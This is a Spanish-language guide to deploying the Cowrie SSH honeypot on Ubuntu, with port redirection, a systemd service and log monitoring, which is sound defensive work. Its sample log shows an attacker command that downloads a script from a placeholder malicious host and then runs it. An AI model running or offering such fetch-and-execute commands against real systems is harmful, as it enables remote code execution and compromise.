# Cowrie SSH Honeypot en Ubuntu: Guía completa
 
**Cowrie** es un honeypot SSH/Telnet de código abierto que simula un servidor Linux real. Cuando un atacante se conecta al puerto 22, cae en un shell falso donde todas sus acciones quedan registradas: comandos ejecutados, credenciales probadas, archivos descargados y más.
 
---
 
## ¿Cómo funciona el setup?
 
```
Internet → Puerto 22 → iptables (redirige) → Puerto 2222 (Cowrie)
                                                        ↓
Tu SSH real corre en el puerto 22222 (oculto)
```
 
El atacante piensa que está en tu servidor real. Tú ves todo lo que hace.
 
---
 
## Requisitos previos
 
- Ubuntu Server 22.04 LTS o superior
- Usuario con privilegios `sudo`
- Acceso actual por SSH (¡**no cierres tu sesión** hasta terminar!)
---
 
## Paso 1 — Mover tu SSH real a otro puerto
 
> ⚠️ **Crítico**: haz esto primero. Si te equivocas aquí puedes perder acceso al servidor.
 
```bash
sudo nano /etc/ssh/sshd_config
```
 
Cambia la línea `Port`:
 
```
# Puerto nuevo para tu SSH real (elige uno aleatorio > 1024)
Port 22222
```
 
Abre el nuevo puerto en el firewall **antes** de reiniciar SSH:
 
```bash
sudo ufw allow 22222/tcp
sudo ufw reload
```
 
Reinicia SSH:
 
```bash
sudo systemctl restart ssh
sudo systemctl status ssh
```
 
**Abre una segunda terminal y verifica que puedes conectarte con el nuevo puerto:**
 
```bash
ssh usuario@tu-servidor -p 22222
```
 
✅ Si funciona, continúa. Si no, edita el archivo y repite.
 
---
 
## Paso 2 — Instalar dependencias
 
```bash
sudo apt-get update
sudo apt-get install -y \
  git \
  python3-virtualenv \
  libssl-dev \
  libffi-dev \
  build-essential \
  libpython3-dev \
  python3-minimal \
  authbind \
  virtualenv \
  python3.12-venv
```
 
---
 
## Paso 3 — Crear usuario dedicado para Cowrie
 
Cowrie **no debe correr como root**. Crea un usuario sin contraseña:
 
```bash
sudo adduser --disabled-password cowrie
```
 
Presiona Enter en todos los campos opcionales.
 
---
 
## Paso 4 — Descargar Cowrie
 
```bash
sudo su - cowrie
git clone https://github.com/cowrie/cowrie.git
cd cowrie
```
 
---
 
## Paso 5 — Crear entorno virtual e instalar dependencias Python
 
```bash
python3 -m venv cowrie-env
source cowrie-env/bin/activate
pip install --upgrade pip
pip install --upgrade -r requirements.txt
deactivate
exit  # Vuelve a tu usuario normal
```
 
---
 
## Paso 6 — Configurar Cowrie
 
Cambia al usuario cowrie y copia el archivo de configuración base:
 
```bash
sudo su - cowrie
cd cowrie
cp etc/cowrie.cfg.dist etc/cowrie.cfg
nano etc/cowrie.cfg
```
 
Ajusta estas opciones clave:
 
```ini
[honeypot]
# Hostname que verá el atacante en el shell falso
hostname = webserver01
 
# Puerto donde escucha Cowrie internamente
listen_port = 2222
 
# Dirección IP de tu servidor (opcional, deja 0.0.0.0 para todas)
listen_endpoints = tcp:2222:interface=0.0.0.0
```
 
Guarda con `Ctrl+X`, `Y`, `Enter`.
 
---
 
## Paso 7 — Configurar authbind para el puerto 22
 
Los procesos sin root no pueden usar puertos < 1024. `authbind` soluciona esto:
 
```bash
exit  # Vuelve a tu usuario sudo
sudo touch /etc/authbind/byport/22
sudo chown cowrie:cowrie /etc/authbind/byport/22
sudo chmod 777 /etc/authbind/byport/22
```
 
---
 
## Paso 8 — Redirigir el puerto 22 a Cowrie con iptables
 
```bash
sudo iptables -t nat -A PREROUTING -p tcp --dport 22 -j REDIRECT --to-port 2222
sudo iptables -t nat -A PREROUTING -p tcp --dport 23 -j REDIRECT --to-port 2223
```
 
Guarda las reglas para que persistan tras reinicios:
 
```bash
sudo apt-get install -y iptables-persistent
sudo netfilter-persistent save
```
 
---
 
## Paso 9 — Iniciar Cowrie
 
```bash
sudo su - cowrie
cd cowrie
source cowrie-env/bin/activate
bin/cowrie start
```
 
Verifica que esté corriendo:
 
```bash
bin/cowrie status
```
 
Salida esperada:
```
cowrie is running (PID: XXXX)
```
 
---
 
## Paso 10 — Configurar Cowrie como servicio systemd
 
Para que inicie automáticamente con el servidor, crea el servicio:
 
```bash
exit  # Vuelve a tu usuario sudo
sudo nano /etc/systemd/system/cowrie.service
```
 
```ini
[Unit]
Description=Cowrie SSH Honeypot
After=network.target
 
[Service]
Type=forking
User=cowrie
ExecStart=/home/cowrie/cowrie/bin/cowrie start
ExecStop=/home/cowrie/cowrie/bin/cowrie stop
Restart=on-failure
RestartSec=5s
 
[Install]
WantedBy=multi-user.target
```
 
Activa el servicio:
 
```bash
sudo systemctl daemon-reload
sudo systemctl enable cowrie
sudo systemctl start cowrie
sudo systemctl status cowrie
```
 
---
 
## Ver logs en tiempo real
 
```bash
sudo su - cowrie
tail -f ~/cowrie/var/log/cowrie/cowrie.log
```
 
Ejemplo de lo que verás cuando alguien intenta entrar:
 
```
2026-05-01 14:23:01 [SSHService ssh-userauth on HoneyPotSSHTransport] login attempt [root/123456] failed
2026-05-01 14:23:03 [SSHService ssh-userauth on HoneyPotSSHTransport] login attempt [root/password] succeeded
2026-05-01 14:23:05 [SSHChannel session] CMD: wget http://malicious.site/payload.sh
2026-05-01 14:23:05 [SSHChannel session] CMD: chmod +x payload.sh && ./payload.sh
```
 
Los logs en formato JSON están en:
 
```bash
cat ~/cowrie/var/log/cowrie/cowrie.json
```
 
---
 
## Verificar que todo funciona
 
Desde otra máquina, intenta conectarte al puerto 22:
 
```bash
ssh root@tu-servidor
# Contraseña: cualquier cosa
```
 
Deberías "entrar" a un shell falso. En tus logs verás la conexión registrada.
 
Para conectarte a tu servidor **real**, siempre usa el puerto 22222:
 
```bash
ssh usuario@tu-servidor -p 22222
```
 
---
 
## Resumen de puertos
 
| Puerto | Servicio | Descripción |
|--------|----------|-------------|
| `22` | Cowrie (honeypot) | Lo que ven los atacantes |
| `2222` | Cowrie interno | Cowrie escucha aquí realmente |
| `22222` | SSH real (sshd) | Tu acceso legítimo al servidor |
 
---
 
## Consejos adicionales
 
- **Revisa los logs diariamente** — verás patrones de ataques reales en minutos
- **No pongas datos reales** en el filesystem falso de Cowrie (`share/cowrie/fs.pickle`)
- **Aísla el servidor** — idealmente Cowrie corre en una VM o VPS dedicada, no en producción
- **Integra con fail2ban** para bloquear IPs que intenten ataques reales después del honeypot
- Los archivos que los atacantes intenten descargar con `wget` se guardan en `~/cowrie/var/dl/` para análisis
---
 
## Recursos
 
- [Repositorio oficial de Cowrie](https://github.com/cowrie/cowrie)
- [Documentación de Cowrie](https://cowrie.readthedocs.io/)